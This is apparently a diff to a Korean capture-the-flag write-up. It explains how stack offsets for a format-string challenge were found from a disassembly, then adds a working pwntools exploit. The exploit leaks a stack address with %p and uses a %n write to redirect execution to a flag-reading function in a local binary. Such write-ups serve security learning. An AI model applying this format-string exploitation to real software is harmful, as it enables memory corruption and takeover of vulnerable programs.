@@ -413,9 +413,28 @@ Dump of assembler code for function main:
    0x000000000040155b <+452>:   ret
 End of assembler dump.
 ```
-`init` 실행 후에 `&exist` 값을 넣어주는 것을 보아 `rbp - 0x118`이 `exitst_or_not`의 주소임을 알 수 있습니다. `memset`의 `rdi`에 `rbp-0x110`이 들어가는 것을 보아 `rbp-0x110`이 `buf`의 주소임을 알 수 있습니다. 따라서 `buf`의 주소에서 8을 빼면 `exitst_or_not`의 주소가 됩니다. 구하려고 하는 ㄱ
+`init` 실행 후에 `&exist` 값을 넣어주는 것을 보아 `rbp - 0x118`이 `exitst_or_not`의 주소임을 알 수 있습니다. `memset`의 `rdi`에 `rbp-0x110`이 들어가는 것을 보아 `rbp-0x110`이 `buf`의 주소임을 알 수 있습니다. 따라서 `buf`의 주소에서 8을 빼면 `exitst_or_not`의 주소가 됩니다. 구하려고 하는 것들을 전부 구했으므로 `fsb`와 2번 메뉴를 이용해 `open_emergency_medicine`를 실행시켜 `flag`를 읽을 수 있습니다.
 
 - 익스플로잇
+
+```python
+from pwn import *
+context.arch = 'amd64'
+p = process('./fsb')
+
+def fsb(msg : bytes):
+    p.sendlineafter(b'> ', b'1')
+    p.send(msg + b"\n")
+    return p.recvline()[:-1]
+
+oem = 0x401256
+stack = int(fsb(b"%p"), 16)
+addr_exitst_or_not = stack - 8
+payload = f"aa%{oem - 2}c%10$n".encode() + p64(addr_exitst_or_not)
+fsb(payload)
+p.sendlineafter(b'> ', b'2')
+p.interactive()
+```
 
 ---
 ### Chapter 9
